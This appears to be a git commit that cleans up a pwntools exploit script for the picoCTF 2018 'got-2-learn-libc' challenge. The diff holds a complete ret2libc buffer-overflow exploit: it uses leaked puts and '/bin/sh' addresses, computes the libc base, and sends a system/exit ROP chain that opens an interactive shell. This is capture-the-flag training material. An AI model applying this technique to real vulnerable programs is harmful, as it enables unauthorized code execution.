c45e124a7565666f1ecefca237cbdb8f5b64252a
Lzu Tao <1stpangu@gmail.com>
2018-10-19 04:10:33 +0700

    pico2018: Clean-up xpwn.py in pwn/got-2-learn-libc
    Signed-off-by: Lzu Tao <1stpangu@gmail.com>

--- pico2018/pwn/got-2-learn-libc/xpwn.py
+++ pico2018/pwn/got-2-learn-libc/xpwn.py
@@ -1,53 +1,47 @@
 #! /usr/bin/env python
-from pwn import *
+from pwn import process, log, context, p32, u32
+from pwn import ELF
 context.clear(arch='i386', os='linux')
 
 
-class ExploitInfo:
-    name    = '/problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee/vuln'
-    #
-    offset_buf_to_eip = 0x9c + 4
-    # Offsets
-    libc_entrypoint = 0x000187c0
-    offset_puts     = 0x0005f140 - libc_entrypoint
-    offset_system   = 0x0003a940 - libc_entrypoint
-    offset_exit     = 0x0002e7b0 - libc_entrypoint
-
-
 def main():
-    p = process(ExploitInfo.name)
+    elf_name = '/problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee/vuln'
+    libc_name = 'libc.so.6'
+    elf = ELF(elf_name)
+    libc = ELF(libc_name)
+    OFFSET_buf_to_eip = 0x9c + 4
+
+    p = process(elf_name)
 
     p.recvuntil('puts: ')
-    leak = p.recvline().strip()
-    puts_addr = int(leak, 16)
+    leak = p.recvline(keepends=False)
+    ADDR_puts = int(leak, 16)
 
     p.recvuntil('useful_string: ')
-    leak = p.recvline()
-    bin_sh_addr = int(leak, 16)
+    leak = p.recvline(keepends=False)
+    ADDR_bin_sh = int(leak, 16)
 
     # Calculate libc base
-    libc_base   = puts_addr - ExploitInfo.offset_puts
-    system_addr = libc_base + ExploitInfo.offset_system # + 3 # +3 to avoid null byte on address
-    exit_addr   = libc_base + ExploitInfo.offset_exit
+    libc.address = ADDR_puts - libc.symbols['puts']
+    ADDR_system = libc.symbols['system'] # + 3 # +3 to avoid null byte on address
+    ADDR_exit = libc.symbols['exit']
 
-    log.info("puts is at    : 0x%x" % puts_addr)
-    log.info("libc base     : 0x%x" % libc_base)
-    log.info("system is at  : 0x%x" % system_addr)
-    log.info("exit is at    : 0x%x" % exit_addr)
-    log.info("/bin/sh is at : 0x%x" % bin_sh_addr)
+    log.info("puts    @ %s", hex(ADDR_puts))
+    log.info("libc    @ %s", hex(libc.address))
+    log.info("system  @ %s", hex(ADDR_system))
+    log.info("exit    @ %s", hex(ADDR_exit))
+    log.info("/bin/sh @ %s", hex(ADDR_bin_sh))
 
-    ropchain = p32(system_addr)
-    ropchain += p32(exit_addr)
-    ropchain += p32(bin_sh_addr)
+    ropchain = p32(ADDR_system)
+    ropchain += p32(ADDR_exit)
+    ropchain += p32(ADDR_bin_sh)
 
-    payload = 'A' * ExploitInfo.offset_buf_to_eip
+    payload = 'A' * OFFSET_buf_to_eip
     payload += ropchain
-    p.clean()
-    p.sendline(payload)
 
-    log.success("Here comes the shell!")
-    p.clean()
-    p.sendline('cd /problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee/')
+    p.sendlineafter('string:\n', payload)
+
+    p.sendlineafter('now...\n', 'cd /problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee/')
     p.sendline('ls -l')
     p.interactive()
 
